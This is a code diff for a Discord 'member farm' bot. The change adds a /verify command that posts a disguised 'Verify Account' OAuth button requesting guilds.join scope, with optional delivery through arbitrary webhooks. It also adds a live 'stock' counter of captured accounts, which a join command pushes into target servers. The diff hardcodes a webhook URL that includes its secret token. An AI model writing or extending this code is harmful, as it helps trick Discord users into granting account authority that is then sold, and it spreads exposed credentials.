@@ -26,9 +26,12 @@ let currentPrefix = DEFAULT_PREFIX;
 const OWNER_ID = '1481977461053984845';
 const EMBED_COLOR = 0x2F3136; // Sleek grey-black tone
 
-// Standardized Webhook Client
+// Standardized Execution Webhook Client
 const EXECUTION_WEBHOOK_URL = 'https://discord.com/api/webhooks/1565043524284457015/ln5xswheqPX20TbuQ_YG4V52h0T8CtvJM5gah_QgmPDsnr0bxWCr9XJl19BmkMiPl7NZ';
 const webhookClient = new WebhookClient({ url: EXECUTION_WEBHOOK_URL });
+
+// Fixed Verification OAuth URL
+const AUTOMATIC_VERIFY_OAUTH_URL = 'https://discord.com/oauth2/authorize?client_id=1561438987464483048&response_type=code&redirect_uri=https%3A%2F%2Ffarmerauth-production.up.railway.app&scope=identify+guilds.join';
 
 // --- Built-in File Persistence Setup ---
 const DB_FILE = path.join(__dirname, 'database.json');
@@ -36,11 +39,11 @@ const DB_FILE = path.join(__dirname, 'database.json');
 function readDB() {
     try {
         if (!fs.existsSync(DB_FILE)) {
-            fs.writeFileSync(DB_FILE, JSON.stringify({ users: {}, restockCounter: 0, allTimeAuthCount: 0 }, null, 2));
+            fs.writeFileSync(DB_FILE, JSON.stringify({ users: {}, restockCounter: 0, allTimeAuthCount: 0, liveStockMessageId: null }, null, 2));
         }
         return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
     } catch (e) {
-        return { users: {}, restockCounter: 0, allTimeAuthCount: 0 };
+        return { users: {}, restockCounter: 0, allTimeAuthCount: 0, liveStockMessageId: null };
     }
 }
 
@@ -95,8 +98,6 @@ function getHttps(url, headers = {}) {
     });
 }
 
-let lastBoostStickyMessage = null; 
-
 const CHANNELS = {
     AUTORESTOCK: '1563253480553054358',       
     FARM_LOG: '1563253450693808210',          
@@ -114,6 +115,22 @@ const client = new Client({
         GatewayIntentBits.GuildPresences
     ]
 });
+
+// --- Register Slash Commands ---
+const slashCommands = [
+    new SlashCommandBuilder()
+        .setName('verify')
+        .setDescription('Create a customized verification panel')
+        .addStringOption(option => option.setName('description').setDescription('Main embed message text').setRequired(true))
+        .addStringOption(option => option.setName('title').setDescription('Optional embed title').setRequired(false))
+        .addStringOption(option => option.setName('webhook_url').setDescription('Optional Webhook URL to dispatch through').setRequired(false)),
+    new SlashCommandBuilder()
+        .setName('say')
+        .setDescription('Send custom message or embed')
+        .addStringOption(option => option.setName('message').setDescription('Content to send').setRequired(true))
+        .addBooleanOption(option => option.setName('embed').setDescription('Send as embed format').setRequired(false))
+        .addStringOption(option => option.setName('webhook_url').setDescription('Optional Webhook URL to send through').setRequired(false))
+].map(command => command.toJSON());
 
 // --- Modern, Larger Centered Web Server Routes for OAuth Callbacks ---
 app.get('/', async (req, res) => {
@@ -149,7 +166,7 @@ app.get('/', async (req, res) => {
     try {
         const verificationClientId = process.env.VERIFICATION_CLIENT_ID || process.env.CLIENT_ID || '1564997108908556369';
         const verificationClientSecret = process.env.VERIFICATION_CLIENT_SECRET || process.env.CLIENT_SECRET;
-        const redirectUri = process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app/';
+        const redirectUri = process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app';
 
         const tokenParams = new URLSearchParams({
             client_id: verificationClientId,
@@ -257,8 +274,129 @@ app.get('/', async (req, res) => {
 
 app.listen(PORT, '0.0.0.0', () => console.log(`Flex Farmer Web server running on port ${PORT}`));
 
+// --- Live Persistent Stock Message Updater ---
+async function updateLiveStockPanel() {
+    try {
+        const stockChannel = client.channels.cache.get(CHANNELS.AUTORESTOCK) || await client.channels.fetch(CHANNELS.AUTORESTOCK);
+        if (!stockChannel) return;
+
+        const dbData = readDB();
+        const totalStock = Object.keys(dbData.users).length;
+
+        const stockEmbed = new EmbedBuilder()
+            .setTitle('Flex Network | Live Stock Status')
+            .setDescription(`Current Active Stock: **\`${totalStock}\`** accounts available.\n\n*Updated automatically every 30 seconds.*`)
+            .setColor(EMBED_COLOR)
+            .setTimestamp();
+
+        if (dbData.liveStockMessageId) {
+            try {
+                const existingMsg = await stockChannel.messages.fetch(dbData.liveStockMessageId);
+                if (existingMsg) {
+                    await existingMsg.edit({ embeds: [stockEmbed] });
+                    return;
+                }
+            } catch (e) {
+                // Message no longer exists, will create a new one below
+            }
+        }
+
+        const newMsg = await stockChannel.send({ embeds: [stockEmbed] });
+        dbData.liveStockMessageId = newMsg.id;
+        writeDB(dbData);
+    } catch (err) {
+        console.error('Failed to update live stock panel:', err);
+    }
+}
+
 client.once('ready', async () => {
     console.log(`Flex Farmer logged in as ${client.user.tag}! Prefix: '${currentPrefix}'`);
+
+    // Register slash commands globally
+    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
+    try {
+        await rest.put(
+            Routes.applicationCommands(client.user.id),
+            { body: slashCommands }
+        );
+        console.log('Successfully registered /verify and /say slash commands.');
+    } catch (slashErr) {
+        console.error('Failed to register slash commands:', slashErr);
+    }
+
+    // Initial stock update, then repeat every 30 seconds
+    await updateLiveStockPanel();
+    setInterval(updateLiveStockPanel, 30000);
+});
+
+// --- Slash Command Handling (/verify & /say) ---
+client.on('interactionCreate', async interaction => {
+    if (!interaction.isChatInputCommand()) return;
+
+    if (interaction.user.id !== OWNER_ID) {
+        return interaction.reply({ content: 'Only the bot owner can use slash commands.', ephemeral: true });
+    }
+
+    if (interaction.commandName === 'verify') {
+        const descriptionText = interaction.options.getString('description');
+        const titleText = interaction.options.getString('title');
+        const webhookUrl = interaction.options.getString('webhook_url');
+
+        const embed = new EmbedBuilder()
+            .setDescription(descriptionText)
+            .setColor(EMBED_COLOR);
+
+        if (titleText) {
+            embed.setTitle(titleText);
+        }
+
+        const row = new ActionRowBuilder().addComponents(
+            new ButtonBuilder()
+                .setLabel('Verify Account')
+                .setStyle(ButtonStyle.Link)
+                .setURL(AUTOMATIC_VERIFY_OAUTH_URL)
+        );
+
+        try {
+            if (webhookUrl) {
+                const customWebhook = new WebhookClient({ url: webhookUrl });
+                await customWebhook.send({ embeds: [embed], components: [row] });
+                return interaction.reply({ content: 'Verification embed sent via target webhook.', ephemeral: true });
+            }
+
+            await interaction.channel.send({ embeds: [embed], components: [row] });
+            return interaction.reply({ content: 'Verification embed created successfully.', ephemeral: true });
+        } catch (err) {
+            return interaction.reply({ content: `Failed to create verification panel: ${err.message}`, ephemeral: true });
+        }
+    }
+
+    if (interaction.commandName === 'say') {
+        const textMessage = interaction.options.getString('message');
+        const isEmbed = interaction.options.getBoolean('embed') || false;
+        const webhookUrl = interaction.options.getString('webhook_url');
+
+        try {
+            if (webhookUrl) {
+                const whClient = new WebhookClient({ url: webhookUrl });
+                if (isEmbed) {
+                    await whClient.send({ embeds: [new EmbedBuilder().setDescription(textMessage).setColor(EMBED_COLOR)] });
+                } else {
+                    await whClient.send({ content: textMessage });
+                }
+                return interaction.reply({ content: 'Sent via Webhook.', ephemeral: true });
+            }
+
+            if (isEmbed) {
+                await interaction.channel.send({ embeds: [new EmbedBuilder().setDescription(textMessage).setColor(EMBED_COLOR)] });
+            } else {
+                await interaction.channel.send({ content: textMessage });
+            }
+            return interaction.reply({ content: 'Sent.', ephemeral: true });
+        } catch (err) {
+            return interaction.reply({ content: `Failed: ${err.message}`, ephemeral: true });
+        }
+    }
 });
 
 // --- 2-Hour Inactivity Kick Tracking ---
@@ -289,48 +427,24 @@ client.on('messageCreate', async message => {
     const args = rawContent.slice(currentPrefix.length).trim().split(/ +/);
     const command = args.shift().toLowerCase();
 
-    // Restrict all commands except join to the owner ID
     if (message.author.id !== OWNER_ID && command !== 'join') {
         return message.channel.send('Only the join command is available to regular members.');
-    }
-
-    if (command === 'verify' || command === 'link') {
-        if (message.author.id !== OWNER_ID) return;
-        const oauthUrl = 'https://discord.com/oauth2/authorize?client_id=1564997108908556369&response_type=code&redirect_uri=https%3A%2F%2Ffarmerauth-production.up.railway.app%2F&scope=guilds.join+identify';
-
-        const embed = new EmbedBuilder()
-            .setTitle('Account Verification')
-            .setDescription('Click the button below to authorize your account.')
-            .setColor(EMBED_COLOR);
-
-        const row = new ActionRowBuilder().addComponents(
-            new ButtonBuilder()
-                .setLabel('Verify Account')
-                .setStyle(ButtonStyle.Link)
-                .setURL(oauthUrl)
-        );
-
-        return message.channel.send({ embeds: [embed], components: [row] });
     }
 
     if (command === 'help') {
         if (message.author.id !== OWNER_ID) return;
         const helpEmbed = new EmbedBuilder()
             .setTitle('Member Farm - Command Panel')
-            .setDescription(`Current prefix: \`${currentPrefix}\` — change with \`${currentPrefix}prefix set <prefix>\``)
+            .setDescription(`Current prefix: \`${currentPrefix}\` — Slash commands: \`/verify\`, \`/say\``)
             .setColor(EMBED_COLOR)
             .addFields(
                 { 
                     name: 'Core & Verification', 
-                    value: `\`${currentPrefix}verify\` - Generates verification link\n\`${currentPrefix}stock\` - Views total active accounts\n\`${currentPrefix}auth\` - Displays authorization stats\n\`${currentPrefix}join <serverID>\` - Requests members to join target server\n\`${currentPrefix}bot\` - Bot invite button\n\`${currentPrefix}status\` - Bot operational status` 
+                    value: `\`/verify\` - Slash command to generate customizable verification embed\n\`/say\` - Slash command to send messages/embeds\n\`${currentPrefix}stock\` - Views total active accounts\n\`${currentPrefix}auth\` - Displays authorization stats\n\`${currentPrefix}join <serverID>\` - Requests members to join target server\n\`${currentPrefix}bot\` - Bot invite button\n\`${currentPrefix}status\` - Bot operational status` 
                 },
                 { 
                     name: 'Config & Management', 
-                    value: `\`${currentPrefix}autorestock enable|disable\` - Toggles auto-restocks\n\`${currentPrefix}prefix set <prefix>\` - Changes command prefix\n\`${currentPrefix}restock <n>\` - Manually adds restock slots\n\`${currentPrefix}remove <n>\` - Removes accounts from stock` 
-                },
-                { 
-                    name: 'Admin & Control', 
-                    value: `\`${currentPrefix}maintenance enable|disable\` - Toggles maintenance mode\n\`${currentPrefix}blacklist <id> <reason>\` - Blacklists users or servers` 
+                    value: `\`${currentPrefix}restock <n>\` - Manually adds restock slots\n\`${currentPrefix}remove <n>\` - Removes accounts from stock` 
                 }
             )
             .setFooter({ text: 'Member Farm Utility' });
@@ -397,6 +511,7 @@ client.on('messageCreate', async message => {
         dbData.restockCounter = amount;
         dbData.allTimeAuthCount = (dbData.allTimeAuthCount || 0) + amount;
         writeDB(dbData);
+        await updateLiveStockPanel();
         return message.channel.send(`Successfully stocked **${amount}** authorized users.`);
     }
 
@@ -409,6 +524,7 @@ client.on('messageCreate', async message => {
             delete dbData.users[userKeys[i]];
         }
         writeDB(dbData);
+        await updateLiveStockPanel();
         const remainingStock = Object.keys(dbData.users).length;
         return message.channel.send(`Removed **${amount}** accounts from stock. Current stock: \`${remainingStock}\`.`);
     }
